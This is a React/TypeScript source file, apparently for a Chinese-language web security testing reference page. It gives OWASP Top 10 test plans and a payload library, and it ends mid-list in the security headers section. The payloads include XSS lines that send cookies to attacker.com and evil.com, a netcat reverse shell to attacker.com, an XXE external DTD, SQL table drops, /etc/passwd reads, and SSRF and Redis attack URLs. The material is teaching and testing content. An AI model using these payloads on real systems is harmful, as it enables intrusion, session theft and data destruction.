import { ToolLayout } from "@/components/ToolLayout";
import { Card, CardContent } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Tooltip, TooltipContent, TooltipTrigger } from "@/components/ui/tooltip";
import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/components/ui/collapsible";
import { Shield, AlertTriangle, Bug, Lock, Terminal, HelpCircle, FileText, ChevronDown, Wrench, Target, CheckSquare, Play } from "lucide-react";
import { useState } from "react";

const HelpTip = ({ content }: { content: string }) => (
  <Tooltip>
    <TooltipTrigger asChild>
      <HelpCircle className="h-3.5 w-3.5 text-muted-foreground hover:text-primary cursor-help inline-block ml-1" />
    </TooltipTrigger>
    <TooltipContent side="top" className="max-w-xs text-xs">
      {content}
    </TooltipContent>
  </Tooltip>
);

const CodeBlock = ({ code, language = "javascript" }: { code: string; language?: string }) => (
  <pre className="p-3 bg-muted rounded text-xs font-mono text-foreground overflow-x-auto whitespace-pre-wrap">
    {code}
  </pre>
);

const SecurityTestingReference = () => {
  const [openItems, setOpenItems] = useState<string[]>([]);

  const toggleItem = (id: string) => {
    setOpenItems(prev => 
      prev.includes(id) ? prev.filter(item => item !== id) : [...prev, id]
    );
  };

  const owaspTop10 = [
    {
      id: "A01",
      name: "访问控制失效",
      description: "用户可以访问未授权的功能或数据",
      help: "最常见的安全漏洞，攻击者通过修改URL、参数或请求绕过权限检查",
      severity: "critical",
      tests: [
        { text: "水平越权测试", help: "尝试用用户A的凭证访问用户B的数据，如修改URL中的用户ID" },
        { text: "垂直越权测试", help: "普通用户尝试访问管理员功能，如直接访问/admin路径" },
        { text: "IDOR测试", help: "不安全的直接对象引用，通过可预测的ID访问他人资源" },
        { text: "目录遍历", help: "使用../等路径访问服务器上的敏感文件" },
        { text: "强制浏览", help: "直接访问未链接但存在的页面如/backup、/.git" },
      ],
      testPlan: {
        tools: [
          { name: "Burp Suite", usage: "拦截请求，修改用户ID、订单ID等参数" },
          { name: "Postman", usage: "构造不同用户Token的API请求" },
          { name: "浏览器开发者工具", usage: "修改前端隐藏的表单字段和参数" },
        ],
        scenarios: [
          {
            name: "水平越权 - 订单查看",
            steps: [
              "1. 使用用户A登录，获取用户A的订单ID（如：order_123）",
              "2. 使用用户B登录，尝试访问 /api/orders/order_123",
              "3. 检查是否能看到用户A的订单详情",
            ],
            expected: "应返回403 Forbidden或提示无权限",
            payload: "GET /api/orders/{其他用户的订单ID}",
          },
          {
            name: "垂直越权 - 管理员功能",
            steps: [
              "1. 使用普通用户账号登录",
              "2. 直接访问 /admin、/api/admin/users 等管理接口",
              "3. 尝试调用删除用户、修改权限等管理API",
            ],
            expected: "应返回401/403，不能执行管理操作",
            payload: "DELETE /api/admin/users/123\nAuthorization: Bearer {普通用户Token}",
          },
          {
            name: "IDOR - 遍历资源ID",
            steps: [
              "1. 获取当前用户的资源ID（如 file_id=1001）",
              "2. 使用Burp Intruder批量测试 file_id=1~9999",
              "3. 观察哪些ID返回200且包含数据",
            ],
            expected: "只能访问自己的资源，其他返回403",
            payload: "GET /api/files/$id$ (id从1遍历到9999)",
          },
        ],
        checklist: [
          "修改URL中的ID参数是否能访问他人数据",
          "删除/修改请求中的Authorization头后是否仍能访问",
          "普通用户能否直接调用管理员API",
          "前端隐藏的按钮对应的API是否有后端权限校验",
        ],
      },
    },
    {
      id: "A02",
      name: "加密机制失效",
      description: "敏感数据未加密存储或传输",
      help: "包括密码明文存储、使用弱加密算法、HTTPS配置不当等",
      severity: "critical",
      tests: [
        { text: "HTTPS配置检查", help: "验证是否强制使用HTTPS，证书是否有效" },
        { text: "敏感数据加密验证", help: "检查数据库中密码、信用卡等是否加密存储" },
        { text: "密码哈希算法检查", help: "确认使用bcrypt/argon2而非MD5/SHA1" },
        { text: "API密钥暴露扫描", help: "检查代码和Git历史中是否泄露密钥" },
        { text: "Cookie安全属性", help: "验证Secure、HttpOnly、SameSite属性" },
      ],
      testPlan: {
        tools: [
          { name: "testssl.sh", usage: "检测SSL/TLS配置：testssl.sh https://target.com" },
          { name: "Wireshark", usage: "抓包分析是否有明文传输敏感数据" },
          { name: "浏览器开发者工具", usage: "Application > Cookies 查看安全属性" },
          { name: "curl", usage: "测试HTTP是否重定向到HTTPS" },
        ],
        scenarios: [
          {
            name: "HTTPS强制跳转测试",
            steps: [
              "1. 使用curl访问HTTP版本：curl -I http://target.com",
              "2. 检查是否返回301/302重定向到HTTPS",
              "3. 检查HSTS头是否存在",
            ],
            expected: "HTTP应强制跳转HTTPS，且有HSTS头",
            payload: "curl -I http://target.com\n# 期望: Location: https://target.com\n# 期望: Strict-Transport-Security: max-age=...",
          },
          {
            name: "Cookie安全属性检查",
            steps: [
              "1. 登录系统，打开开发者工具 > Application > Cookies",
              "2. 检查Session Cookie的属性",
              "3. 验证HttpOnly、Secure、SameSite设置",
            ],
            expected: "敏感Cookie应有HttpOnly=true, Secure=true",
            payload: "检查点：\n☐ HttpOnly: true (防XSS读取)\n☐ Secure: true (仅HTTPS传输)\n☐ SameSite: Strict/Lax (防CSRF)",
          },
          {
            name: "敏感数据传输抓包",
            steps: [
              "1. 配置Burp/Fiddler代理",
              "2. 执行登录、支付、修改密码等操作",
              "3. 检查请求/响应中是否有明文密码、卡号",
            ],
            expected: "密码应在传输前加密或使用HTTPS，响应不返回明文密码",
            payload: "关注字段：password, creditCard, ssn, token\n这些字段不应以明文出现在请求体或URL中",
          },
        ],
        checklist: [
          "HTTP是否强制重定向到HTTPS",
          "SSL证书是否有效且未过期",
          "是否禁用了TLS 1.0/1.1等过时协议",
          "Cookie是否设置了HttpOnly和Secure属性",
          "密码在数据库中是否为哈希存储（非明文/非MD5）",
          "API响应中是否返回了不必要的敏感信息",
        ],
      },
    },
    {
      id: "A03",
      name: "注入攻击",
      description: "通过输入恶意数据执行非预期命令",
      help: "攻击者在输入中嵌入恶意代码，被服务器当作命令执行",
      severity: "critical",
      tests: [
        { text: "SQL注入", help: "在输入框中插入SQL语句破坏数据库查询逻辑" },
        { text: "XSS攻击", help: "注入JavaScript代码在用户浏览器中执行" },
        { text: "命令注入", help: "在系统命令参数中插入额外命令" },
        { text: "LDAP注入", help: "篡改LDAP查询获取未授权信息" },
        { text: "NoSQL注入", help: "针对MongoDB等NoSQL数据库的注入攻击" },
      ],
      testPlan: {
        tools: [
          { name: "SQLMap", usage: "自动化SQL注入：sqlmap -u 'url?id=1' --dbs" },
          { name: "Burp Suite Intruder", usage: "批量Payload测试" },
          { name: "XSS Hunter", usage: "检测存储型XSS并获取回调" },
          { name: "手工测试", usage: "在输入框逐一尝试Payload" },
        ],
        scenarios: [
          {
            name: "SQL注入 - 登录绕过",
            steps: [
              "1. 在登录页面的用户名输入框输入Payload",
              "2. 密码随意填写",
              "3. 观察是否能绕过认证登录成功",
            ],
            expected: "应提示用户名或密码错误，不能登录成功",
            payload: "用户名: admin' --\n用户名: ' OR '1'='1' --\n用户名: admin'/*\n用户名: ' OR 1=1#",
          },
          {
            name: "XSS - 反射型测试",
            steps: [
              "1. 找到搜索框、URL参数等输入点",
              "2. 输入XSS Payload",
              "3. 检查页面是否弹出alert或执行脚本",
            ],
            expected: "Payload应被转义显示，不执行JavaScript",
            payload: "<script>alert('XSS')</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\"><script>alert(1)</script>",
          },
          {
            name: "XSS - 存储型测试",
            steps: [
              "1. 在评论、用户名、个人简介等持久化字段输入Payload",
              "2. 保存后，用另一个账号/浏览器访问该内容",
              "3. 检查Payload是否被执行",
            ],
            expected: "内容应被转义存储和显示",
            payload: "<script>fetch('https://attacker.com?c='+document.cookie)</script>\n<img src=x onerror=\"new Image().src='https://attacker.com?c='+document.cookie\">",
          },
          {
            name: "命令注入测试",
            steps: [
              "1. 找到可能调用系统命令的功能（ping、文件操作、PDF生成等）",
              "2. 在输入中尝试注入命令分隔符",
              "3. 观察响应时间或返回内容",
            ],
            expected: "不执行注入的命令，返回错误或过滤",
            payload: "127.0.0.1; whoami\n127.0.0.1 | id\n127.0.0.1 && cat /etc/passwd\n$(whoami)\n`id`",
          },
        ],
        checklist: [
          "所有输入框是否都测试了SQL注入Payload",
          "搜索、评论、用户资料是否测试了XSS",
          "文件名、URL参数是否测试了路径遍历",
          "涉及系统命令的功能是否测试了命令注入",
          "错误信息是否暴露了数据库类型或SQL语句",
        ],
      },
    },
    {
      id: "A04",
      name: "不安全设计",
      description: "设计阶段的安全缺陷",
      help: "代码实现正确但设计本身存在安全隐患",
      severity: "high",
      tests: [
        { text: "业务逻辑漏洞测试", help: "如购物车负数价格、跳过支付步骤等" },
        { text: "威胁建模验证", help: "识别系统中的信任边界和攻击面" },
        { text: "安全需求审查", help: "验证安全需求是否在设计中体现" },
        { text: "数据流分析", help: "追踪敏感数据在系统中的流向" },
      ],
      testPlan: {
        tools: [
          { name: "Burp Suite", usage: "修改请求参数，测试业务逻辑" },
          { name: "浏览器开发者工具", usage: "修改前端计算的价格、数量" },
          { name: "Postman", usage: "跳过流程步骤直接调用后续API" },
        ],
        scenarios: [
          {
            name: "价格篡改测试",
            steps: [
              "1. 添加商品到购物车",
              "2. 拦截下单请求，修改price或total字段",
              "3. 将价格改为0.01或负数",
              "4. 提交订单检查是否成功",
            ],
            expected: "后端应重新计算价格，不信任前端传值",
            payload: "原请求: {\"productId\":1,\"price\":999,\"quantity\":1}\n篡改为: {\"productId\":1,\"price\":0.01,\"quantity\":1}",
          },
          {
            name: "流程跳过测试",
            steps: [
              "1. 分析正常业务流程（如：选商品→填地址→支付→完成）",
              "2. 跳过中间步骤，直接调用最后一步API",
              "3. 检查是否能不支付就完成订单",
            ],
            expected: "应验证前置步骤是否完成",
            payload: "跳过支付直接调用:\nPOST /api/orders/complete\n{\"orderId\": \"xxx\", \"status\": \"paid\"}",
          },
          {
            name: "数量/库存逻辑测试",
            steps: [
              "1. 测试购买数量为负数、0、小数、超大数",
              "2. 测试同时下单超过库存数量",
              "3. 并发测试抢购场景",
            ],
            expected: "应有数量验证和库存锁定机制",
            payload: "quantity: -1 (负数)\nquantity: 0\nquantity: 99999999 (超大数)\nquantity: 1.5 (小数)",
          },
          {
            name: "暴力破解防护测试",
            steps: [
              "1. 使用Burp Intruder对登录接口发送100次错误密码",
              "2. 观察是否触发账户锁定或验证码",
              "3. 测试密码重置接口的频率限制",
            ],
            expected: "应有登录失败次数限制和锁定机制",
            payload: "使用Intruder:\nPayload: 常见密码字典\n观察: 是否返回不同响应或被限制",
          },
        ],
        checklist: [
          "价格、折扣是否由后端计算",
          "业务流程是否可以被跳过",
          "是否有速率限制防暴力破解",
          "敏感操作是否需要二次验证",
          "并发场景是否有竞态条件问题",
        ],
      },
    },
    {
      id: "A05",
      name: "安全配置错误",
      description: "不安全的默认配置",
      help: "使用默认密码、开启调试模式、暴露敏感端点等",
      severity: "high",
      tests: [
        { text: "默认凭据检查", help: "测试admin:admin、root:root等常见默认密码" },
        { text: "错误信息泄露", help: "检查错误页面是否暴露堆栈跟踪等敏感信息" },
        { text: "目录列表暴露", help: "检查是否可以列出服务器目录内容" },
        { text: "不必要的服务/端口", help: "扫描并关闭不需要的网络服务" },
        { text: "HTTP方法测试", help: "检查是否启用了PUT、DELETE、TRACE等危险方法" },
      ],
      testPlan: {
        tools: [
          { name: "Nmap", usage: "端口扫描：nmap -sV -sC target.com" },
          { name: "Nikto", usage: "Web服务器配置扫描：nikto -h target.com" },
          { name: "Dirsearch", usage: "敏感目录枚举：dirsearch -u target.com" },
          { name: "curl", usage: "测试HTTP方法和响应头" },
        ],
        scenarios: [
          {
            name: "默认凭据测试",
            steps: [
              "1. 访问管理后台登录页",
              "2. 尝试常见默认账号密码组合",
              "3. 检查是否能登录成功",
            ],
            expected: "默认密码应已修改，无法登录",
            payload: "常见默认凭据:\nadmin:admin\nadmin:123456\nroot:root\ntest:test\nadmin:password\nadministrator:administrator",
          },
          {
            name: "敏感路径探测",
            steps: [
              "1. 使用Dirsearch或手工访问敏感路径",
              "2. 检查哪些路径返回200或有内容",
              "3. 评估信息泄露风险",
            ],
            expected: "敏感路径应返回404或403",
            payload: "测试路径:\n/.git/config\n/.env\n/backup/\n/admin/\n/phpinfo.php\n/server-status\n/.htaccess\n/web.config\n/robots.txt\n/sitemap.xml",
          },
          {
            name: "错误信息泄露测试",
            steps: [
              "1. 构造会触发错误的请求（如无效ID、SQL语法错误）",
              "2. 观察错误响应内容",
              "3. 检查是否暴露堆栈、路径、版本信息",
            ],
            expected: "错误信息应通用，不暴露技术细节",
            payload: "触发错误:\n/api/users/invalid-id\n/api/search?q='\n/api/files/../../../etc/passwd",
          },
          {
            name: "HTTP方法测试",
            steps: [
              "1. 使用curl测试不同HTTP方法",
              "2. 检查OPTIONS返回的Allow头",
              "3. 尝试PUT、DELETE、TRACE方法",
            ],
            expected: "只允许必要的HTTP方法",
            payload: "curl -X OPTIONS https://target.com -I\ncurl -X TRACE https://target.com\ncurl -X PUT https://target.com/test.txt -d 'test'\ncurl -X DELETE https://target.com/api/users/1",
          },
        ],
        checklist: [
          "是否修改了所有默认账号密码",
          "调试模式是否已关闭",
          "错误页面是否隐藏了技术细节",
          "目录列表是否已禁用",
          "是否关闭了不必要的端口和服务",
          "响应头是否隐藏了服务器版本信息",
        ],
      },
    },
    {
      id: "A06",
      name: "过时组件",
      description: "使用含有已知漏洞的组件",
      help: "依赖库版本过旧，存在已公开的安全漏洞",
      severity: "medium",
      tests: [
        { text: "npm audit", help: "Node.js项目依赖漏洞扫描" },
        { text: "依赖版本检查", help: "检查是否使用最新稳定版本" },
        { text: "CVE漏洞扫描", help: "对照CVE数据库检查已知漏洞" },
        { text: "软件清单(SBOM)", help: "生成并审查软件物料清单" },
      ],
      testPlan: {
        tools: [
          { name: "npm audit", usage: "Node.js依赖扫描：npm audit" },
          { name: "Snyk", usage: "全面依赖扫描：snyk test" },
          { name: "OWASP Dependency-Check", usage: "多语言依赖扫描" },
          { name: "Trivy", usage: "容器镜像扫描：trivy image xxx" },
          { name: "Retire.js", usage: "检测前端JS库漏洞" },
        ],
        scenarios: [
          {
            name: "前端依赖扫描",
            steps: [
              "1. 获取项目代码或package.json",
              "2. 运行 npm audit 或 yarn audit",
              "3. 分析漏洞严重程度和影响",
            ],
            expected: "无高危或严重漏洞",
            payload: "npm audit --json\nnpm audit --audit-level=high\n# 查看详细信息\nnpm audit fix --dry-run",
          },
          {
            name: "生产环境JS库检测",
            steps: [
              "1. 访问目标网站，打开开发者工具",
              "2. 查看加载的JS库版本",
              "3. 对照CVE数据库检查漏洞",
            ],
            expected: "无已知漏洞的库版本",
            payload: "检查方法:\n1. 控制台输入 jQuery.fn.jquery 查看jQuery版本\n2. 查看React: React.version\n3. 使用Retire.js浏览器插件自动检测",
          },
          {
            name: "后端/服务器版本检测",
            steps: [
              "1. 检查响应头中的Server、X-Powered-By",
              "2. 通过特征识别框架版本",
              "3. 搜索该版本已知CVE",
            ],
            expected: "版本信息应隐藏，无已知高危CVE",
            payload: "curl -I https://target.com\n# 查看: Server, X-Powered-By, X-AspNet-Version等\n# 搜索: https://nvd.nist.gov/vuln/search",
          },
        ],
        checklist: [
          "npm audit是否有高危漏洞",
          "前端库版本是否有已知CVE",
          "后端框架版本是否最新",
          "是否有依赖更新流程",
          "CI/CD是否集成安全扫描",
        ],
      },
    },
    {
      id: "A07",
      name: "身份验证失效",
      description: "身份验证和会话管理实现不当",
      help: "弱密码策略、会话劫持、凭证填充等攻击",
      severity: "critical",
      tests: [
        { text: "弱密码策略测试", help: "检查是否允许123456等弱密码" },
        { text: "暴力破解防护", help: "验证是否有登录失败锁定机制" },
        { text: "会话固定攻击", help: "登录前后Session ID是否改变" },
        { text: "会话超时验证", help: "检查空闲会话是否自动过期" },
        { text: "多因素认证", help: "验证MFA实现是否可被绕过" },
        { text: "密码重置流程", help: "检查重置链接是否一次性且有时效" },
      ],
      testPlan: {
        tools: [
          { name: "Burp Suite", usage: "拦截分析登录流程和Session" },
          { name: "Hydra", usage: "暴力破解测试（授权后使用）" },
          { name: "浏览器开发者工具", usage: "查看Cookie和Session变化" },
        ],
        scenarios: [
          {
            name: "弱密码策略测试",
            steps: [
              "1. 注册或修改密码时尝试弱密码",
              "2. 测试各类不符合规范的密码",
              "3. 观察系统是否拒绝",
            ],
            expected: "应拒绝弱密码，提示密码规则",
            payload: "测试密码:\n123456\npassword\n12345678\nqwerty\n111111\nabc123\n用户名相同的密码\n纯数字短密码",
          },
          {
            name: "会话固定攻击测试",
            steps: [
              "1. 访问登录页，记录当前Session ID",
              "2. 登录成功后，再次检查Session ID",
              "3. 对比登录前后Session ID是否变化",
            ],
            expected: "登录后Session ID应重新生成",
            payload: "登录前 Cookie: session=abc123\n登录后 Cookie: session=xyz789 (应不同)\n\n如果相同，存在会话固定风险",
          },
          {
            name: "会话超时测试",
            steps: [
              "1. 登录系统，记录Session",
              "2. 保持页面空闲一段时间（如30分钟）",
              "3. 尝试执行操作，检查是否需要重新登录",
            ],
            expected: "超时后应要求重新认证",
            payload: "测试场景:\n1. 关闭浏览器后Session是否失效\n2. 空闲30分钟后Session是否过期\n3. 手动退出后Session是否立即失效",
          },
          {
            name: "密码重置流程测试",
            steps: [
              "1. 请求密码重置，获取重置链接",
              "2. 分析重置Token的可预测性",
              "3. 测试Token是否一次性、是否有时效",
              "4. 测试能否枚举用户（用户名存在提示）",
            ],
            expected: "Token随机、一次性、有时效",
            payload: "检查点:\n☐ Token是否足够随机（>32字符）\n☐ 使用后Token是否失效\n☐ Token是否有过期时间\n☐ 是否限制重置请求频率",
          },
        ],
        checklist: [
          "是否有密码复杂度要求",
          "登录失败是否有次数限制",
          "Session是否在登录后重新生成",
          "Session是否有超时机制",
          "密码重置Token是否安全",
          "是否支持安全的MFA",
        ],
      },
    },
    {
      id: "A08",
      name: "软件和数据完整性失效",
      description: "未验证软件更新和数据完整性",
      help: "CI/CD管道被篡改、依赖包被替换、反序列化攻击等",
      severity: "high",
      tests: [
        { text: "CI/CD管道安全", help: "检查构建流程是否可被恶意修改" },
        { text: "依赖完整性验证", help: "验证npm包是否使用lock文件锁定版本" },
        { text: "反序列化攻击", help: "检查是否安全处理序列化数据" },
        { text: "代码签名验证", help: "验证发布包的数字签名" },
      ],
      testPlan: {
        tools: [
          { name: "浏览器开发者工具", usage: "检查SRI和脚本完整性" },
          { name: "Git", usage: "审查CI/CD配置和提交历史" },
          { name: "Burp Suite", usage: "测试反序列化漏洞" },
        ],
        scenarios: [
          {
            name: "SRI完整性检查",
            steps: [
              "1. 查看页面源码中的外部JS/CSS引用",
              "2. 检查是否有integrity属性",
              "3. 验证crossorigin属性设置",
            ],
            expected: "外部资源应有SRI校验",
            payload: "正确示例:\n<script src=\"https://cdn.example.com/lib.js\" \n  integrity=\"sha384-xxx\" \n  crossorigin=\"anonymous\"></script>\n\n检查: 是否所有CDN资源都有integrity",
          },
          {
            name: "依赖锁文件检查",
            steps: [
              "1. 检查项目是否有package-lock.json或yarn.lock",
              "2. 确认lock文件是否纳入版本控制",
              "3. 检查安装命令是否使用npm ci",
            ],
            expected: "应使用lock文件锁定依赖版本",
            payload: "检查点:\n☐ 存在 package-lock.json 或 yarn.lock\n☐ lock文件在Git仓库中\n☐ CI/CD使用 npm ci 而非 npm install",
          },
          {
            name: "反序列化漏洞测试",
            steps: [
              "1. 找到接受序列化数据的接口（如Cookie、JWT payload）",
              "2. 尝试注入恶意序列化数据",
              "3. 观察服务器行为",
            ],
            expected: "应验证反序列化数据，不执行恶意代码",
            payload: "测试点:\n1. JWT payload篡改（修改后重签名）\n2. Cookie中的序列化对象\n3. 文件上传中的序列化数据\n\n常见特征: base64编码的对象数据",
          },
        ],
        checklist: [
          "外部脚本是否使用SRI",
          "是否使用lock文件锁定依赖",
          "CI/CD配置是否有访问控制",
          "反序列化是否有类型白名单",
          "更新和发布是否有签名验证",
        ],
      },
    },
    {
      id: "A09",
      name: "日志和监控失效",
      description: "缺乏有效的日志记录和监控",
      help: "无法检测和响应安全事件，攻击行为不被记录",
      severity: "medium",
      tests: [
        { text: "安全事件日志检查", help: "验证登录失败、权限变更等是否记录" },
        { text: "告警机制验证", help: "检查异常行为是否触发告警" },
        { text: "日志注入测试", help: "验证日志内容是否被正确转义" },
        { text: "日志保留策略", help: "确认日志保留时间满足合规要求" },
      ],
      testPlan: {
        tools: [
          { name: "日志管理系统", usage: "查看安全事件日志记录情况" },
          { name: "Burp Suite", usage: "构造异常请求测试日志记录" },
          { name: "监控系统", usage: "验证告警触发机制" },
        ],
        scenarios: [
          {
            name: "登录事件日志验证",
            steps: [
              "1. 执行多次登录失败",
              "2. 执行一次登录成功",
              "3. 检查日志系统是否记录这些事件",
              "4. 验证日志包含必要字段（IP、时间、用户）",
            ],
            expected: "所有认证事件应被记录",
            payload: "期望日志字段:\n- timestamp (时间戳)\n- event_type (login_success/login_failure)\n- username (用户名)\n- ip_address (来源IP)\n- user_agent (浏览器信息)",
          },
          {
            name: "日志注入测试",
            steps: [
              "1. 在用户输入中包含换行符和日志格式",
              "2. 检查日志中这些内容是否被转义",
              "3. 验证是否能伪造日志条目",
            ],
            expected: "特殊字符应被转义，不能伪造日志",
            payload: "测试输入:\nusername: admin\\n[INFO] User admin logged in\nusername: test\\r\\n2024-01-01 00:00:00 [ERROR] Fake log\n\n日志中应显示为转义后的文本",
          },
          {
            name: "敏感信息日志检查",
            steps: [
              "1. 执行包含敏感信息的操作（登录、支付）",
              "2. 检查日志中是否记录了密码、卡号等",
              "3. 验证日志脱敏机制",
            ],
            expected: "密码、Token等敏感信息不应出现在日志中",
            payload: "检查日志中是否包含:\n☐ 明文密码\n☐ 完整信用卡号\n☐ Session Token\n☐ API密钥\n\n这些都应被脱敏或不记录",
          },
        ],
        checklist: [
          "登录成功/失败是否记录",
          "权限变更是否记录",
          "敏感操作是否记录",
          "日志中是否脱敏敏感信息",
          "是否有异常行为告警",
          "日志保留时间是否符合要求",
        ],
      },
    },
    {
      id: "A10",
      name: "服务端请求伪造",
      description: "SSRF - 利用服务端发起恶意请求",
      help: "诱导服务器访问内网资源或云元数据接口",
      severity: "high",
      tests: [
        { text: "内网探测测试", help: "尝试让服务器访问内网IP如192.168.x.x" },
        { text: "云元数据访问", help: "尝试访问169.254.169.254获取云凭证" },
        { text: "协议走私测试", help: "使用file://、gopher://等协议绕过限制" },
        { text: "DNS重绑定", help: "通过DNS解析变化绕过IP白名单" },
      ],
      testPlan: {
        tools: [
          { name: "Burp Collaborator", usage: "检测出站请求" },
          { name: "RequestBin", usage: "接收SSRF回调请求" },
          { name: "Burp Suite", usage: "修改URL参数测试SSRF" },
        ],
        scenarios: [
          {
            name: "URL参数SSRF测试",
            steps: [
              "1. 找到接受URL参数的功能（图片预览、链接获取、webhook等）",
              "2. 将URL替换为内网地址或Burp Collaborator",
              "3. 观察服务器是否发起请求",
            ],
            expected: "应限制可访问的URL范围",
            payload: "测试URL:\nhttp://127.0.0.1/admin\nhttp://localhost:8080\nhttp://192.168.1.1\nhttp://10.0.0.1\nhttp://[::1]/\nhttp://your-collaborator.burpcollaborator.net",
          },
          {
            name: "云元数据访问测试",
            steps: [
              "1. 在URL参数中输入云厂商元数据地址",
              "2. 检查是否返回云凭证或实例信息",
              "3. 测试不同云厂商的元数据地址",
            ],
            expected: "应阻止访问元数据服务",
            payload: "AWS: http://169.254.169.254/latest/meta-data/\nGCP: http://metadata.google.internal/\nAzure: http://169.254.169.254/metadata/instance\n阿里云: http://100.100.100.200/latest/meta-data/",
          },
          {
            name: "协议测试",
            steps: [
              "1. 尝试使用非HTTP协议",
              "2. 测试file://、dict://、gopher://等",
              "3. 观察服务器行为",
            ],
            expected: "应只允许HTTP/HTTPS协议",
            payload: "file:///etc/passwd\nfile:///C:/Windows/System32/drivers/etc/hosts\ndict://127.0.0.1:6379/info\ngopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall",
          },
          {
            name: "IP绕过测试",
            steps: [
              "1. 如果有IP黑名单，尝试各种绕过方式",
              "2. 使用IP的不同表示形式",
              "3. 使用短网址或重定向",
            ],
            expected: "各种IP变体都应被正确识别和阻止",
            payload: "127.0.0.1的变体:\nhttp://0x7f000001/ (十六进制)\nhttp://2130706433/ (十进制)\nhttp://0177.0.0.1/ (八进制)\nhttp://127.1/\nhttp://127.0.1/\nhttp://0/",
          },
        ],
        checklist: [
          "是否限制了可访问的协议（仅HTTP/HTTPS）",
          "是否有URL白名单机制",
          "是否阻止访问内网IP",
          "是否阻止访问云元数据服务",
          "是否验证DNS解析结果",
          "重定向是否被正确处理",
        ],
      },
    },
  ];

  const injectionPayloads = [
    { 
      type: "SQL注入", 
      help: "通过在用户输入中嵌入SQL代码来操纵数据库查询",
      payloads: [
        { code: "' OR '1'='1", desc: "永真条件绕过认证" },
        { code: "' OR '1'='1' --", desc: "注释掉后续SQL语句" },
        { code: "1; DROP TABLE users--", desc: "删除数据库表（危险）" },
        { code: "' UNION SELECT NULL--", desc: "联合查询探测列数" },
        { code: "' UNION SELECT username,password FROM users--", desc: "提取用户凭证" },
        { code: "1' AND '1'='1", desc: "布尔盲注测试-真" },
        { code: "1' AND '1'='2", desc: "布尔盲注测试-假" },
        { code: "1' AND SLEEP(5)--", desc: "时间盲注测试" },
      ] 
    },
    { 
      type: "XSS跨站脚本", 
      help: "在网页中注入恶意脚本，在用户浏览器中执行",
      payloads: [
        { code: "<script>alert('XSS')</script>", desc: "基础反射型XSS测试" },
        { code: "<img src=x onerror=alert(1)>", desc: "图片错误事件触发" },
        { code: "<svg onload=alert(1)>", desc: "SVG加载事件触发" },
        { code: "javascript:alert(1)", desc: "伪协议（用于href属性）" },
        { code: "<body onload=alert(1)>", desc: "页面加载触发" },
        { code: "<input onfocus=alert(1) autofocus>", desc: "自动聚焦触发" },
        { code: "'-alert(1)-'", desc: "模板字符串注入" },
        { code: "<script>document.location='http://evil.com/steal?c='+document.cookie</script>", desc: "窃取Cookie" },
      ] 
    },
    { 
      type: "命令注入", 
      help: "在系统命令中注入额外命令，控制服务器",
      payloads: [
        { code: "; ls -la", desc: "分号分隔执行新命令" },
        { code: "| cat /etc/passwd", desc: "管道符读取密码文件" },
        { code: "&& whoami", desc: "AND运算符链接命令" },
        { code: "|| id", desc: "OR运算符（前命令失败时执行）" },
        { code: "`id`", desc: "反引号命令替换" },
        { code: "$(whoami)", desc: "$()命令替换" },
        { code: "; nc -e /bin/sh attacker.com 4444", desc: "反弹Shell（危险）" },
      ] 
    },
    { 
      type: "路径遍历", 
      help: "通过../等相对路径访问服务器上的任意文件",
      payloads: [
        { code: "../../../etc/passwd", desc: "Linux密码文件" },
        { code: "....//....//....//etc/passwd", desc: "双写绕过过滤" },
        { code: "..\\..\\..\\windows\\system32\\config\\sam", desc: "Windows SAM文件" },
        { code: "%2e%2e%2f%2e%2e%2f", desc: "URL编码绕过" },
        { code: "....//....//....//etc/shadow", desc: "Linux影子密码文件" },
        { code: "%252e%252e%252f", desc: "双重URL编码绕过" },
        { code: "..%c0%af..%c0%af", desc: "UTF-8编码绕过" },
      ] 
    },
    { 
      type: "SSRF服务端请求伪造", 
      help: "诱导服务器向内部或外部发起恶意请求",
      payloads: [
        { code: "http://127.0.0.1:22", desc: "探测本地SSH端口" },
        { code: "http://169.254.169.254/latest/meta-data/", desc: "AWS元数据（获取IAM凭证）" },
        { code: "http://192.168.1.1/admin", desc: "访问内网管理页面" },
        { code: "file:///etc/passwd", desc: "file协议读取本地文件" },
        { code: "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall", desc: "Gopher协议攻击Redis" },
        { code: "http://0x7f000001/", desc: "十六进制IP绕过" },
        { code: "http://2130706433/", desc: "十进制IP绕过" },
      ] 
    },
    { 
      type: "XXE外部实体注入", 
      help: "通过XML外部实体读取文件或发起SSRF",
      payloads: [
        { code: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', desc: "读取本地文件" },
        { code: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>', desc: "外部DTD加载" },
        { code: '<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">', desc: "PHP源码读取" },
      ] 
    },
    { 
      type: "LDAP注入", 
      help: "篡改LDAP查询条件获取未授权数据",
      payloads: [
        { code: "*)(uid=*))(|(uid=*", desc: "通配符注入" },
        { code: "admin)(&)", desc: "布尔注入" },
        { code: "x)(|(cn=*", desc: "OR条件注入" },
      ] 
    },
  ];

  const securityHeaders = [
    { header: "X-Frame-Options", value: "SAMEORIGIN", description: "防止点击劫持", help: "限制页面只能在同源iframe中嵌入，防止恶意网站嵌入您的页面进行欺骗" },
    { header: "X-Content-Type-Options", value: "nosniff", description: "防止MIME类型嗅探", help: "阻止浏览器猜测响应内容类型，防止将非脚本文件当作脚本执行" },
    { header: "X-XSS-Protection", value: "1; mode=block", description: "浏览器XSS过滤", help: "启用浏览器内置XSS过滤器，检测到攻击时阻止页面加载" },
    { header: "Strict-Transport-Security", value: "max-age=31536000; includeSubDomains", description: "强制HTTPS", help: "告诉浏览器只能通过HTTPS访问，防止SSL剥离攻击" },
    { header: "Content-Security-Policy", value: "default-src 'self'; script-src 'self'", description: "内容安全策略", help: "限制资源加载来源，有效防止XSS、数据注入等攻击" },
    { header: "Referrer-Policy", value: "strict-origin-when-cross-origin", description: "控制Referer信息", help: "限制跨域请求时Referer头携带的信息，保护用户隐私" },
    { header: "Permissions-Policy", value: "geolocation=(), camera=(), microphone=()", description: "权限策略", help: "禁用或限制浏览器功能如地理位置、摄像头等" },
